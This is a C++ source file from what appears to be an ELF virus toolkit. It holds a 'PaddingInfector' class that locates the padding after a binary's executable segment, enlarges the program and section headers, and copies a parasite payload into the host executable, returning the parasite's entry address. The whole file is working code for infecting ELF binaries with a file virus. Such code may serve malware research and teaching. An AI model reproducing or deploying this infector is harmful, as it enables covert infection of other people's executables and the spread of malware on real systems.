#include "infector/padding_infector.hh"
#include "common/macros.hh"
#include "common/math.hh"
#include "nostdlib/stdio.hh"
#include "nostdlib/string.hh"

namespace vf::infector {
namespace {
// Patch SHT (i.e. find the last section of CODE segment and increase its size
// by parasite_size)
bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
               size_t parasite_size_and_padding,
               Elf64_Off code_segment_last_byte_offset) {
  auto sht_entry_count = ehdr.e_shnum;

  auto section_entry = &shdr;
  for (size_t i = 0; i < sht_entry_count; ++i) {
    auto current_section_last_byte_offset =
        section_entry->sh_offset + section_entry->sh_size - 1;
    if (code_segment_last_byte_offset == current_section_last_byte_offset) {
      // expand the size while accounting for the alignment padding.
      section_entry->sh_size += parasite_size_and_padding;
      return true;
    }
    // Move to the next section entry
    ++section_entry;
  }
  // Failed to find the section header entry.
  return false;
}

void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
                size_t patch_phdr_entry_idx) {
  auto phdr_entry = &phdr;
  phdr_entry += patch_phdr_entry_idx;

  // expand the size while accounting for the alignment padding.
  phdr_entry->p_filesz += parasite_size_and_padding;
  phdr_entry->p_memsz += parasite_size_and_padding;
}

}  // namespace

// Gather information about the elf that can be used to inject parasite into a
// code cave.
// @param host_mapping The host elf mapping.
// @param parasite_size The size of the parasite.
// @param[out] info A struct of information.
bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
                              std::span<const std::byte> parasite_mapping) {
  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());

  if ((ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
      ehdr.e_ident[EI_CLASS] != ELFCLASS64) {
    return false;
  }

  original_entry_point_ = ehdr.e_entry;
  host_size_ = host_mapping.size();

  uint16_t pht_entry_count = ehdr.e_phnum;
  Elf64_Off code_segment_last_byte_offset = 0;
  Elf64_Off parasite_file_offset = 0;
  Elf64_Addr parasite_load_address = 0;

  // Point to first entry in PHT
  auto* phdr_entry =
      reinterpret_cast<const Elf64_Phdr*>(&host_mapping[ehdr.e_phoff]);

  // Parse PHT entries
  for (size_t i = 0; i < pht_entry_count; ++i, ++phdr_entry) {
    // Find the CODE Segment (containing .text section)
    if (code_segment_last_byte_offset == 0 && phdr_entry->p_type == PT_LOAD &&
        phdr_entry->p_flags == (PF_R | PF_X)) {
      // Calculate the offset of the last byte of the code segment.
      code_segment_last_byte_offset =
          phdr_entry->p_offset + phdr_entry->p_filesz - 1;
      // Sometimes the last section in CODE is .data. Make sure the parasite
      // start address is word aligned for arm. X86-64 has no such requirements.
      parasite_file_offset =
          common::round_up_to(code_segment_last_byte_offset, 4);
      parasite_load_address = common::round_up_to(
          phdr_entry->p_vaddr + phdr_entry->p_filesz - 1, 4);
      continue;
    }

    // Find next segment after CODE Segment and calculate padding size
    if (code_segment_last_byte_offset != 0) {
      if (phdr_entry->p_type != PT_LOAD) {
        // Usually the next segment is R only (rodata) or R/W (data). If the
        // next segment is not loadable to result in a code cave, or if we see
        // another executable segment, the binary probably uses a custom linker
        // script that we can't reasonably inject with certainty. Bail out to
        // avoid corrupting it.
        return false;
      }
      // Return padding_size (maximum size of parasite that host can accommodate
      // in its padding between the end of CODE segment and start of next
      // loadable segment)

      padding_size_ = phdr_entry->p_offset - parasite_file_offset;
      code_segment_last_byte_offset_ = code_segment_last_byte_offset;
      parasite_file_offset_ = parasite_file_offset;
      parasite_load_address_ = parasite_load_address;
      // the previous entry was for CODE segment
      patch_phdr_entry_idx_ = i - 1;
      // Add the extra alignment if necessary because the parasite starts at
      // an aligned address, account for the extra padding. For example, the
      // last byte of CODE is at 0x04, which makes the next word aligned
      // address suitable for virus insertion to start at 0x08. The padding
      // between 0x08 and 0x04 (byte at 0x05, 0x06, 0x07) needs to be added
      // to the total size.
      parasite_size_and_padding_ = parasite_file_offset -
                                   code_segment_last_byte_offset - 1 +
                                   parasite_mapping.size();
      return true;
    }
  }

  return false;
}

std::optional<InjectionResult> PaddingInfector::inject(
    std::span<std::byte> host_mapping,
    std::span<const std::byte> parasite_mapping) {
  if (padding_size_ < parasite_mapping.size()) {
    vf::printf(STR_LITERAL("Host cannot fit parasite padding: %%d parasite "
                           "size:%%d\n"),
               padding_size_, parasite_mapping.size());
    return std::nullopt;
  }

  const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());

  {
    auto& phdr = reinterpret_cast<Elf64_Phdr&>(host_mapping[ehdr.e_phoff]);
    // Patch program header table and increase text section size.
    patch_phdr(phdr, parasite_size_and_padding_, patch_phdr_entry_idx_);
  }

  {
    auto& shdr = reinterpret_cast<Elf64_Shdr&>(host_mapping[ehdr.e_shoff]);
    // Patch section header table to increase text section size.
    if (!patch_sht(ehdr, shdr, parasite_size_and_padding_,
                   code_segment_last_byte_offset_)) {
      return std::nullopt;
    }
  }

  // Inject parasite.
  vf::memcpy(&host_mapping[parasite_file_offset_], &parasite_mapping.front(),
             parasite_mapping.size());

  return InjectionResult{
      .parasite_entry_address = parasite_load_address_,
      .parasite_file_offset = parasite_file_offset_,
  };
}

}  // namespace vf::infector